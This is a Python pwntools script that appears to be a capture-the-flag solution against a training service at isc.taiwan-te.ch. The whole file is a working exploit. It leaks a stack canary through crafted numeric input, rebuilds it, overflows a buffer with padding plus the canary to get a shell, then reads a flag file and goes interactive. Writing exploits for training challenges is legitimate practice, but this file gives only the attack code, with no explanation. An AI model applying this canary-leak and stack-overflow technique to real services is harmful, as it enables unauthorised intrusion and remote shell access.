from pwn import *

host = 'isc.taiwan-te.ch'
port = 10009

while True:
    r = remote(host, port)
    try:
        p = (' ' + str(0xffff)) * 20

        r.recvuntil('numbers:\n')
        r.sendline(p)

        r.recvuntil('result:\n')

        num = []
        for i in range(4):
            num.append(int(r.recvuntil(' ')))

        s = ''
        for i in range(4):
            s += hex(num[i])[2:]
        canary = p64(int(s, 16))

        p = 'a' * 0x28 + canary
        r.recvuntil('name:\n')
        r.send(p)
        r.recvuntil('shell\n')
    except EOFError:
        r.close()
    else:
        break

r.sendline('cat /home/`whoami`/flag')
r.interactive()
